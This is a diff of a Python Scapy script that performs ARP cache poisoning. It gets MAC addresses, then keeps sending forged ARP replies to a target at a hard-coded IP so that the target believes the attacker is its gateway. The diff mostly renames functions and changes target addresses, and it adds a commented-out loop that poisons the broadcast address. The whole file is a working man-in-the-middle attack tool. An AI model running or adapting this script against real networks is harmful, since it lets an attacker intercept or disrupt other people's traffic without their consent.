@@ -1,41 +1,42 @@
-from scapy.all import Ether, ARP, sendp, srp
+from scapy.all import Ether, ARP, sendp, send, srp
 import time
 import sys
 
 
-def getMac(ip):
+def get_mac(ip):
     ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
     for snd, rcv in ans:
         return rcv.sprintf(r"%Ether.src%")
+    print(f"Failed to get MAC address for {ip}")
     return None
 
 
-def poisoningDone(target_ip, target_mac, host_ip, host_mac):
-    pkt_target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=host_ip)
-    pkt_host = Ether(dst=host_mac) / ARP(op=2, pdst=host_ip, psrc=target_ip)
+def poisoning_done(target_ip, target_mac, host_ip, host_mac):
+    pkt2target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=host_ip)
+    pkt2host = Ether(dst=host_mac) / ARP(op=2, pdst=host_ip, psrc=target_ip)
     while True:
-        sendp(pkt_target, verbose=False)
-        # sendp(pkt_host, verbose=False)
+        sendp(pkt2target, verbose=False)
         time.sleep(1)
 
 
-def arpPoisoning(target_ip, host_ip):
-    target_mac = getMac(target_ip)
-    host_mac = getMac(host_ip)
+def main(target_ip, host_ip):
+    target_mac = get_mac(target_ip)
+    host_mac = get_mac(host_ip)
 
     if target_mac is None:
-        print(f"Failed to get MAC address for target IP {target_ip}")
         sys.exit(1)
     if host_mac is None:
-        print(f"Failed to get MAC address for host IP {host_ip}")
         sys.exit(1)
 
-    print(f"Start ARP Poisoning: {target_ip} {target_mac} <--> {host_ip} {host_mac}")
+    print(f"Start: {target_ip}({target_mac}) <--> {host_ip}({host_mac})")
 
     try:
-        poisoningDone(target_ip, target_mac, host_ip, host_mac)
+        poisoning_done(target_ip, target_mac, host_ip, host_mac)
     except KeyboardInterrupt:
         sys.exit(0)
 
 
-arpPoisoning("192.168.33.38", "192.168.33.1")
+main("192.168.101.230", "192.168.100.1")
+# while True:
+#     poisoning_done("192.168.101.35", "ff:ff:ff:ff:ff:ff", "192.168.100.1", "00:0c:29:8b:9d:68")
+#     time.sleep(1)
